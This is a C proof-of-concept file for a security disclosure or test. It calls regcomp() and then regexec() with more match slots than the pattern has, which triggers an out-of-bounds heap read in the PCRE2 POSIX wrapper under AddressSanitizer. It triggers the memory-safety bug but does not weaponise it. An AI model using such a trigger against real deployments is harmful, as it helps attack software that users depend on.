/* Proof-of-concept for a heap-buffer-overflow (CWE-125, out-of-bounds read)
   in the PCRE2 POSIX wrapper.

   It uses only the public POSIX API exported by <pcre2posix.h> with ordinary,
   in-contract input: a pattern that contains a few capturing subexpressions is
   compiled with regcomp(), and regexec() is then asked to report the captured
   substrings into a caller-provided vector.  Requesting more match slots than
   the pattern has subexpressions is perfectly legal POSIX usage (the surplus
   slots are reported as unused, i.e. rm_so == rm_eo == -1).

   On a correct build this runs cleanly.  On the vulnerable build regexec()
   reads one regmatch_t pair past the end of the internal match-data ovector,
   which AddressSanitizer reports as a heap-buffer-overflow. */

#include <stdio.h>
#include <pcre2posix.h>

int
main(void)
{
  regex_t re;
  /* Three capturing subexpressions -> four meaningful match slots. */
  regmatch_t pmatch[8];
  size_t i;
  int rc;

  if (regcomp(&re, "(a)(b)(c)", 0) != 0)
    return 2;

  /* In-contract: ask for more slots than the pattern needs. */
  rc = regexec(&re, "abc", 8, pmatch, 0);

  for (i = 0; i < 8; i++)
    (void)pmatch[i];

  printf("regexec rc=%d m0=%d,%d nsub=%zu\n", rc,
         (int)pmatch[0].rm_so, (int)pmatch[0].rm_eo, re.re_nsub);

  regfree(&re);
  return 0;
}
